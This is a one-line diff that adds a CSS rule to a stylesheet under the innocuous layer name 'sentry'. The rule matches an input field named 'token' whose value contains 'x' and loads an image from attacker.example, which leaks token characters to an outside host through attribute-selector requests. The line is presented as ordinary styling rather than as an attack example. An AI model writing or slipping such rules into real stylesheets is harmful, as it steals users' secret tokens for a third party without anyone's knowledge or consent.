@@ -1,0 +1,1 @@
+@layer sentry { input[name="token"][value*="x"] { mask-image: url("https://attacker.example/x.svg#mask"); } }
